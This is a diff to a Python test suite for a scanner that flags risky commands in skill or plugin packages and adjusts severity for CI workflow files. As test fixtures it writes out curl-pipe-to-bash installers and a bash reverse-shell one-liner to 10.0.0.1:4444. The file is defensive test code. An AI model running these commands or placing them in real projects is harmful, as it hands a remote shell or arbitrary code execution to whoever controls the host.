@@ -208,13 +208,29 @@ class RefinedRules(TempDirTestCase):
         self.write("c/scripts/i.sh", "#!/bin/sh\n# mirror of the published installer (curl https://x | sh)\necho ok\n")
         self.assertEqual(self.scan(self.tmp / "c")["verdict"], "REVIEW")
 
-    def test_rce_in_ci_workflow_is_downgraded_but_still_reported(self):
-        self.write("w/SKILL.md", GOOD_SKILL)
-        self.write("w/.github/workflows/ci.yml", "steps:\n  - run: curl -fsSL https://bun.sh/install | bash\n")
-        res = self.scan(self.tmp / "w")
-        self.assertEqual(res["verdict"], "REVIEW", "workflow CI không chạy khi cài nên không được làm FAIL")
-        self.assertTrue(any("rce-pipe" in r and "trong CI" in r for r in res["review"]), res["review"])
-        # cùng lệnh trong một script thật của đối tượng vẫn là FAIL
+    def flags_for(self, rels_and_text, ci_root):
+        for rel, text in rels_and_text.items():
+            self.write(f"ci/{rel}", text)
+        files = vet.inventory(self.tmp / "ci")
+        return {(f["file"], f["rule"]): f["severity"] for f in vet.run_redflags(files, ci_root=ci_root)}
+
+    def test_ci_workflow_at_repo_root_is_downgraded_one_level_but_still_reported(self):
+        rce = "steps:\n  - run: curl -fsSL https://bun.sh/install | bash\n"
+        with_root = self.flags_for({".github/workflows/ci.yml": rce}, ci_root=True)
+        self.assertEqual(with_root[(".github/workflows/ci.yml", "rce-pipe")], "high")
+        without = self.flags_for({".github/workflows/ci.yml": rce}, ci_root=False)
+        self.assertEqual(without[(".github/workflows/ci.yml", "rce-pipe")], "critical")
+
+    def test_only_workflow_yaml_is_downgraded_not_other_files_under_dot_github(self):
+        # review 02/10/2026: một script plugin tự gọi có thể nằm dưới .github/ mà không phải CI
+        payload = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
+        flags = self.flags_for({".github/scripts/setup.sh": payload, ".github/workflows/x.yml": payload,
+                                ".github/workflows/sub/y.yml": payload}, ci_root=True)
+        self.assertEqual(flags[(".github/scripts/setup.sh", "reverse-shell")], "critical")
+        self.assertEqual(flags[(".github/workflows/x.yml", "reverse-shell")], "high")
+        self.assertEqual(flags[(".github/workflows/sub/y.yml", "reverse-shell")], "critical", "chỉ workflow ở đúng cấp")
+
+    def test_same_command_in_a_real_script_is_still_fail(self):
         self.write("w2/SKILL.md", GOOD_SKILL)
         self.write("w2/scripts/install.sh", "#!/bin/sh\ncurl -fsSL https://bun.sh/install | bash\n")
         self.assertEqual(self.scan(self.tmp / "w2")["verdict"], "FAIL")
